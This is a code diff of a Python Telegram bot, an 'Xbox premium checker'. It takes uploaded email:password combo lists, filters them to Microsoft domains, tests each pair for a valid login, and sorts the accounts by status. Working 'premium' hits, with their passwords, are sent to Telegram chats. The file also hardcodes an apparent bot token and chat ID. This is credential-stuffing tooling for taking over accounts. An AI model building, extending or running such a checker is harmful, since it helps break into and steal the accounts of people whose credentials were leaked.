@@ -8,8 +8,7 @@ import tempfile
 import shutil
 import traceback
 from datetime import datetime
-from collections import defaultdict
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
@@ -411,104 +410,89 @@ class ResultManager:
 # ============================================================
 
 # ============================================================
-# MULTI-WORKER CONCURRENT PROCESSING SYSTEM
+# SIMPLE RELIABLE QUEUE SYSTEM
 # ============================================================
 
 BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
 CHAT_ID = 8260250818
-MAX_CONCURRENT_WORKERS = 5
+MAX_WORKERS = 3  # Balanced for Railway
 
 ALLOWED_DOMAINS = [
-    'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de',
-    'outlook.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de',
-    'live.com', 'live.co.uk', 'live.fr', 'live.de',
-    'msn.com', 'passport.com'
+    'hotmail.com', 'outlook.com', 'live.com', 'msn.com'
 ]
 
 task_queue = queue.Queue()
-active_tasks = {}
-active_tasks_lock = threading.Lock()
-worker_running = True
-loop = None
-app = None
+active_count = 0
+active_lock = threading.Lock()
+bot_app = None
+event_loop = None
 
-class ScanTask:
-    def __init__(self, file_path, original_name, file_id, chat_id):
+class Task:
+    def __init__(self, file_path, file_name, file_id, chat_id):
         self.file_path = file_path
-        self.original_name = original_name
+        self.file_name = file_name
         self.file_id = file_id
         self.chat_id = chat_id
         self.created_at = datetime.now()
-        self.status = "pending"
 
-def validate_microsoft_domain(email):
+def validate_domain(email):
     try:
         domain = email.split('@')[-1].lower().strip()
         return domain in ALLOWED_DOMAINS
     except:
         return False
 
-def validate_and_filter_file(file_path):
+def filter_file(file_path):
     try:
         with open(file_path, 'r', encoding='utf-8') as f:
             lines = f.readlines()
         
-        valid_lines = []
-        invalid_emails = []
-        
+        valid = []
+        invalid = []
         for line in lines:
             line = line.strip()
             if not line or ':' not in line:
                 continue
             email = line.split(':', 1)[0].strip()
-            if validate_microsoft_domain(email):
-                valid_lines.append(line)
+            if validate_domain(email):
+                valid.append(line)
             else:
-                if len(invalid_emails) < 5:
-                    invalid_emails.append(email)
+                if len(invalid) < 5:
+                    invalid.append(email)
         
-        if not valid_lines:
-            return None, 0, len([l for l in lines if l.strip() and ':' in l]) - len(valid_lines), invalid_emails
+        if not valid:
+            return None, 0, len([l for l in lines if l.strip() and ':' in l]) - len(valid), invalid
         
-        filtered_dir = tempfile.mkdtemp()
-        filtered_path = os.path.join(filtered_dir, 'filtered_' + os.path.basename(file_path))
-        with open(filtered_path, 'w', encoding='utf-8') as f:
-            f.write('\n'.join(valid_lines))
+        temp_dir = tempfile.mkdtemp()
+        filtered = os.path.join(temp_dir, 'filtered_' + os.path.basename(file_path))
+        with open(filtered, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(valid))
         
-        return filtered_path, len(valid_lines), len([l for l in lines if l.strip() and ':' in l]) - len(valid_lines), invalid_emails
-    except Exception:
+        return filtered, len(valid), len([l for l in lines if l.strip() and ':' in l]) - len(valid), invalid
+    except:
         return None, 0, 0, []
 
-def process_single_file(task):
+def process_file(task):
+    global active_count
     try:
         with open(task.file_path, 'r', encoding='utf-8') as f:
-            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
+            lines = [l.strip() for l in f if l.strip() and ':' in l]
         
         if not lines:
             asyncio.run_coroutine_threadsafe(
-                send_error_message(task, "No valid accounts"),
-                loop
+                bot_app.bot.send_message(chat_id=CHAT_ID, text=f"❌ No valid accounts in {task.file_name}"),
+                event_loop
             )
             return
         
-        stats = {
-            "total": len(lines),
-            "checked": 0,
-            "premium": 0,
-            "free": 0,
-            "bad": 0,
-            "expired": 0,
-            "banned": 0,
-            "two_factor": 0,
-            "timeout": 0,
-            "error": 0
-        }
+        stats = {'total': len(lines), 'checked': 0, 'premium': 0, 'free': 0, 'bad': 0, 'expired': 0, 'banned': 0, 'two_factor': 0, 'timeout': 0, 'error': 0}
+        checker = XboxChecker()
+        batch = []
         
-        premium_results = []
-        batch_buffer = []
-        BATCH_SIZE = 15
-        
-        checker = XboxChecker(debug=False)
+        asyncio.run_coroutine_threadsafe(
+            bot_app.bot.send_message(chat_id=CHAT_ID, text=f"🚀 **Started:** {task.file_name}\n📊 Total: {stats['total']} accounts", parse_mode='Markdown'),
+            event_loop
+        )
         
         for idx, line in enumerate(lines, 1):
             try:
@@ -520,305 +504,204 @@ def process_single_file(task):
                 status = result['status']
                 data = result.get('data', {})
                 
-                result_entry = f"{email}:{password}"
-                
-                if status == "PREMIUM":
-                    stats["premium"] += 1
-                    premium_results.append((email, password, data))
-                    result_entry += f"  PREMIUM | {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days"
-                    batch_buffer.append(result_entry)
-                    
+                if status == 'PREMIUM':
+                    stats['premium'] += 1
+                    batch.append(f"✅ {email[:35]}... - PREMIUM")
                     try:
                         sender = TelegramSender()
                         msg = sender.format_hit_message(email, password, data)
                         sender.send_message(msg)
                     except:
                         pass
-                        
-                elif status == "FREE":
-                    stats["free"] += 1
-                    result_entry += f"  FREE ACCOUNT"
-                    batch_buffer.append(result_entry)
-                    
-                elif status == "EXPIRED":
-                    stats["expired"] += 1
-                    stats["bad"] += 1
-                    result_entry += f"  EXPIRED"
-                    batch_buffer.append(result_entry)
-                    
-                elif status == "BANNED":
-                    stats["banned"] += 1
-                    stats["bad"] += 1
-                    result_entry += f"  BANNED"
-                    batch_buffer.append(result_entry)
-                    
-                elif status == "2FACTOR":
-                    stats["two_factor"] += 1
-                    stats["bad"] += 1
-                    result_entry += f"  2FA REQUIRED"
-                    batch_buffer.append(result_entry)
-                    
-                elif status == "TIMEOUT":
-                    stats["timeout"] += 1
-                    stats["bad"] += 1
-                    result_entry += f"  TIMEOUT"
-                    batch_buffer.append(result_entry)
-                    
-                elif status == "ERROR":
-                    stats["error"] += 1
-                    stats["bad"] += 1
-                    result_entry += f"  ERROR"
-                    batch_buffer.append(result_entry)
-                    
+                elif status == 'FREE':
+                    stats['free'] += 1
+                    batch.append(f"🆓 {email[:35]}... - FREE")
+                elif status == '2FACTOR':
+                    stats['two_factor'] += 1
+                    stats['bad'] += 1
+                    batch.append(f"🔐 {email[:35]}... - 2FA")
+                elif status == 'BANNED':
+                    stats['banned'] += 1
+                    stats['bad'] += 1
+                    batch.append(f"🚫 {email[:35]}... - BANNED")
+                elif status == 'EXPIRED':
+                    stats['expired'] += 1
+                    stats['bad'] += 1
+                    batch.append(f"⏰ {email[:35]}... - EXPIRED")
+                elif status == 'TIMEOUT':
+                    stats['timeout'] += 1
+                    stats['bad'] += 1
+                    batch.append(f"⏱️ {email[:35]}... - TIMEOUT")
+                elif status == 'ERROR':
+                    stats['error'] += 1
+                    stats['bad'] += 1
+                    batch.append(f"⚠️ {email[:35]}... - ERROR")
                 else:
-                    stats["bad"] += 1
-                    result_entry += f"  BAD CREDENTIALS"
-                    batch_buffer.append(result_entry)
+                    stats['bad'] += 1
+                    batch.append(f"❌ {email[:35]}... - BAD")
                 
-                stats["checked"] += 1
+                stats['checked'] += 1
                 
-                if len(batch_buffer) >= BATCH_SIZE:
+                if len(batch) >= 10:
+                    progress = f"📊 **Progress:** {stats['checked']}/{stats['total']}\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch) + "\n```"
                     asyncio.run_coroutine_threadsafe(
-                        send_batch_update(task, batch_buffer.copy(), stats),
-                        loop
+                        bot_app.bot.send_message(chat_id=CHAT_ID, text=progress, parse_mode='Markdown'),
+                        event_loop
                     )
-                    batch_buffer.clear()
+                    batch = []
                 
-                time.sleep(0.15)
+                time.sleep(0.1)
                 
             except Exception as e:
-                stats["error"] += 1
-                stats["bad"] += 1
-                stats["checked"] += 1
-                batch_buffer.append(f"{line[:50]}...  ERROR: {str(e)[:30]}")
-                if len(batch_buffer) >= BATCH_SIZE:
-                    asyncio.run_coroutine_threadsafe(
-                        send_batch_update(task, batch_buffer.copy(), stats),
-                        loop
-                    )
-                    batch_buffer.clear()
+                stats['error'] += 1
+                stats['bad'] += 1
         
-        if batch_buffer:
+        if batch:
+            final_batch = f"📊 **Final Batch:**\n\n```\n" + "\n".join(batch) + "\n```"
             asyncio.run_coroutine_threadsafe(
-                send_batch_update(task, batch_buffer.copy(), stats),
-                loop
+                bot_app.bot.send_message(chat_id=CHAT_ID, text=final_batch, parse_mode='Markdown'),
+                event_loop
             )
         
-        premium_text = "\n".join([f"{e}:{p} | {d.get('premium_type', 'UNKNOWN')} | {d.get('days_remaining', '0')} days" for e, p, d in premium_results])
-        
+        summary = f"✅ **SCAN COMPLETE**\n\n📄 `{task.file_name}`\n━━━━━━━━━━━━━━━━━━━━\n🔢 Total: {stats['total']}\n✅ PREMIUM: {stats['premium']}\n🆓 FREE: {stats['free']}\n❌ BAD: {stats['bad']}\n━━━━━━━━━━━━━━━━━━━━"
         asyncio.run_coroutine_threadsafe(
-            send_final_results(task, stats, premium_text),
-            loop
+            bot_app.bot.send_message(chat_id=CHAT_ID, text=summary, parse_mode='Markdown'),
+            event_loop
         )
         
     except Exception as e:
         asyncio.run_coroutine_threadsafe(
-            send_error_message(task, str(e)),
-            loop
+            bot_app.bot.send_message(chat_id=CHAT_ID, text=f"❌ Error: {str(e)[:200]}"),
+            event_loop
         )
     finally:
-        with active_tasks_lock:
-            if task.file_id in active_tasks:
-                del active_tasks[task.file_id]
-        
-        if task.file_path and os.path.exists(task.file_path):
+        with active_lock:
+            active_count -= 1
+        if os.path.exists(task.file_path):
             try:
                 shutil.rmtree(os.path.dirname(task.file_path))
             except:
                 pass
 
-def worker_loop(worker_id):
-    while worker_running:
+def worker():
+    while True:
         try:
-            with active_tasks_lock:
-                current_active = len(active_tasks)
-            
-            if current_active >= MAX_CONCURRENT_WORKERS:
-                time.sleep(0.5)
-                continue
+            with active_lock:
+                if active_count >= MAX_WORKERS:
+                    time.sleep(1)
+                    continue
             
             try:
                 task = task_queue.get(timeout=1)
             except queue.Empty:
-                time.sleep(0.5)
+                time.sleep(1)
                 continue
             
-            with active_tasks_lock:
-                active_tasks[task.file_id] = task
+            with active_lock:
+                active_count += 1
             
-            asyncio.run_coroutine_threadsafe(
-                send_processing_start(task),
-                loop
-            )
-            
-            process_single_file(task)
+            thread = Thread(target=process_file, args=(task,))
+            thread.daemon = True
+            thread.start()
             
         except Exception as e:
-            print(f"Worker {worker_id} error: {e}")
+            print(f"Worker error: {e}")
             time.sleep(1)
 
-async def send_processing_start(task):
-    msg = f" **XBOX CHECKER STARTED**\n\n `{task.original_name}`\n Started: {task.created_at.strftime('%H:%M:%S')}\n\n Processing accounts... Results will appear in batches."
-    await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
+# ============================================================
+# TELEGRAM HANDLERS
+# ============================================================
 
-async def send_batch_update(task, batch_results, stats):
-    progress = f" **File:** `{task.original_name}`\n"
-    progress += f" **Progress:** {stats['checked']}/{stats['total']} accounts\n"
-    progress += f" **Premium:** {stats['premium']} |  **Free:** {stats['free']} |  **Bad:** {stats['bad']}\n\n"
-    
-    results_text = "\n".join(batch_results[:25])
-    if len(batch_results) > 25:
-        results_text += f"\n... and {len(batch_results) - 25} more"
-    
-    message = progress + "```\n" + results_text + "\n```"
-    
-    try:
-        await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)
-    except:
-        await app.bot.send_message(chat_id=CHAT_ID, text=progress, parse_mode=ParseMode.MARKDOWN)
-
-async def send_final_results(task, stats, premium_text):
-    receipt = (
-        f" **SCAN COMPLETE**\n\n"
-        f" **File:** `{task.original_name}`\n"
-        f" **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
-        f" **FINAL RESULTS**\n"
-        f"\n"
-        f" Total: `{stats['total']}`\n"
-        f" PREMIUM: `{stats['premium']}`\n"
-        f" FREE: `{stats['free']}`\n"
-        f" BAD: `{stats['bad']}`\n"
-        f" Expired: `{stats['expired']}`\n"
-        f" Banned: `{stats['banned']}`\n"
-        f" 2FA: `{stats['two_factor']}`\n"
-        f"\n"
+async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        f"🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
+        f"⚡ Workers: {MAX_WORKERS}\n\n"
+        f"Send a `.txt` file with `email:password` format\n\n"
+        f"**Commands:**\n/start - Help\n/status - Queue status",
+        parse_mode='Markdown'
     )
-    await app.bot.send_message(chat_id=CHAT_ID, text=receipt, parse_mode=ParseMode.MARKDOWN)
-    
-    if stats['premium'] > 0 and premium_text:
-        await app.bot.send_message(
-            chat_id=CHAT_ID,
-            text=f" **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```",
-            parse_mode=ParseMode.MARKDOWN
-        )
-    
-    with active_tasks_lock:
-        remaining = task_queue.qsize()
-    
-    if remaining > 0:
-        await app.bot.send_message(chat_id=CHAT_ID, text=f" {remaining} file(s) still in queue...", parse_mode=ParseMode.MARKDOWN)
-    else:
-        active_count = len(active_tasks)
-        if active_count > 0:
-            await app.bot.send_message(chat_id=CHAT_ID, text=f" {active_count} file(s) still processing...", parse_mode=ParseMode.MARKDOWN)
 
-async def send_error_message(task, error):
-    await app.bot.send_message(chat_id=CHAT_ID, text=f" **ERROR**\n\n `{task.original_name}`\n`{error[:500]}`", parse_mode=ParseMode.MARKDOWN)
-
-async def send_rejection_message(original_name, valid_count, invalid_count, invalid_examples):
-    msg = f" **FILE REJECTED**\n\n `{original_name}`\n Valid Microsoft accounts: `{valid_count}`\n Skipped: `{invalid_count}` non-Microsoft account(s)"
-    if invalid_examples:
-        msg += f"\n\n**Examples rejected:**\n" + "\n".join([f" {e}" for e in invalid_examples[:3]])
-    msg += f"\n\n Allowed domains:\nhotmail.com, outlook.com, live.com, msn.com"
-    await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
-
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = (
-        " **XBOX PREMIUM CHECKER BOT**\n\n"
-        f" **Concurrent Workers:** {MAX_CONCURRENT_WORKERS} files at once\n\n"
-        "Send a `.txt` file with `email:password` format\n\n"
-        "**Allowed domains:**\n"
-        "hotmail.com, outlook.com, live.com, msn.com\n\n"
-        "**Commands:**\n"
-        "/start - This message\n"
-        "/status - Queue status\n\n"
-        " Results appear in batches (15 accounts per update)\n"
-        " Premium hits sent to BOTH Telegram bots instantly!\n"
-        " Multiple files process simultaneously!"
+async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    with active_lock:
+        active = active_count
+        pending = task_queue.qsize()
+    
+    await update.message.reply_text(
+        f"📊 **Status**\n\n"
+        f"⚡ Active: {active}/{MAX_WORKERS}\n"
+        f"⏳ Queue: {pending}",
+        parse_mode='Markdown'
     )
-    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    with active_tasks_lock:
-        active_count = len(active_tasks)
-        queue_size = task_queue.qsize()
-    
-    msg = f" **QUEUE STATUS**\n\n"
-    msg += f" **Active Workers:** {active_count}/{MAX_CONCURRENT_WORKERS}\n"
-    msg += f" **Queue Size:** {queue_size} file(s)\n"
-    msg += f" **Processing:** {'Yes' if active_count > 0 else 'No'}\n\n"
-    msg += f"Send .txt files to add to queue."
-    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    document = update.message.document
-    
-    if not document.file_name.endswith('.txt'):
-        await update.message.reply_text(" Please send a `.txt` file.")
+async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    doc = update.message.document
+    if not doc.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Send a `.txt` file")
         return
     
-    file = await context.bot.get_file(document.file_id)
+    file = await context.bot.get_file(doc.file_id)
     temp_dir = tempfile.mkdtemp()
-    temp_path = os.path.join(temp_dir, document.file_name)
+    temp_path = os.path.join(temp_dir, doc.file_name)
     await file.download_to_drive(temp_path)
     
-    filtered_path, valid_count, invalid_count, invalid_examples = validate_and_filter_file(temp_path)
+    filtered, valid, invalid, examples = filter_file(temp_path)
     
-    if filtered_path is None or valid_count == 0:
-        await send_rejection_message(document.file_name, valid_count, invalid_count, invalid_examples)
+    if not filtered:
+        msg = f"❌ **REJECTED**\n\n📄 {doc.file_name}\nNo valid Microsoft accounts"
+        if examples:
+            msg += f"\n\nExamples: {', '.join(examples[:3])}"
+        await update.message.reply_text(msg, parse_mode='Markdown')
         shutil.rmtree(temp_dir)
         return
     
-    task = ScanTask(file_path=filtered_path, original_name=document.file_name, file_id=document.file_id, chat_id=update.effective_chat.id)
+    task = Task(filtered, doc.file_name, doc.file_id, update.effective_chat.id)
     task_queue.put(task)
     
-    with active_tasks_lock:
-        queue_size = task_queue.qsize()
-        active_count = len(active_tasks)
+    with active_lock:
+        pending = task_queue.qsize()
+        active = active_count
     
     await update.message.reply_text(
-        f" **File Accepted**\n\n"
-        f" `{document.file_name}`\n"
-        f" Valid: `{valid_count}` accounts\n"
-        f" Active Workers: {active_count}/{MAX_CONCURRENT_WORKERS}\n"
-        f" Queue Position: {queue_size}\n\n"
-        f" Will start processing when a worker is free...\n"
-        f" Premium hits sent to BOTH Telegram bots!",
-        parse_mode=ParseMode.MARKDOWN
+        f"✅ **File Accepted**\n\n"
+        f"📄 `{doc.file_name}`\n"
+        f"🔢 Valid: {valid} accounts\n"
+        f"⚡ Active: {active}/{MAX_WORKERS}\n"
+        f"📊 Queue: {pending}\n\n"
+        f"🔄 Processing...",
+        parse_mode='Markdown'
     )
     
-    if invalid_count > 0:
-        await update.message.reply_text(f" Skipped `{invalid_count}` non-Microsoft account(s)", parse_mode=ParseMode.MARKDOWN)
+    if invalid > 0:
+        await update.message.reply_text(f"⚠️ Skipped {invalid} non-Microsoft accounts", parse_mode='Markdown')
 
-def main():
-    global app, loop, worker_running
+# ============================================================
+# MAIN
+# ============================================================
+
+def run_bot():
+    global bot_app, event_loop
     
-    app = Application.builder().token(BOT_TOKEN).build()
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+    event_loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(event_loop)
     
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    bot_app = Application.builder().token(BOT_TOKEN).build()
+    bot_app.add_handler(CommandHandler("start", start_cmd))
+    bot_app.add_handler(CommandHandler("status", status_cmd))
+    bot_app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     
     # Start worker threads
-    worker_running = True
-    for i in range(MAX_CONCURRENT_WORKERS):
-        worker_thread = threading.Thread(target=worker_loop, args=(i+1,), daemon=True)
-        worker_thread.start()
+    for _ in range(MAX_WORKERS):
+        t = Thread(target=worker, daemon=True)
+        t.start()
     
     print("=" * 60)
-    print(" XBOX PREMIUM CHECKER BOT - MULTI-WORKER MODE")
+    print("🎮 XBOX PREMIUM CHECKER BOT")
     print("=" * 60)
-    print(f" Main Bot: {TELEGRAM_BOT_TOKEN_MAIN[:15]}...")
-    print(f" Premium Bot: {TELEGRAM_BOT_TOKEN_PREMIUM[:15]}...")
-    print(f" Concurrent Workers: {MAX_CONCURRENT_WORKERS} files at once")
-    print(f" Premium hits sent to BOTH Telegram bots!")
-    print(" Results in batches of 15 accounts")
+    print(f"✅ Bot started!")
+    print(f"⚡ Workers: {MAX_WORKERS}")
     print("=" * 60)
-    print("Waiting for .txt files...")
     
-    app.run_polling()
+    bot_app.run_polling()
 
 if __name__ == "__main__":
-    main()
+    run_bot()
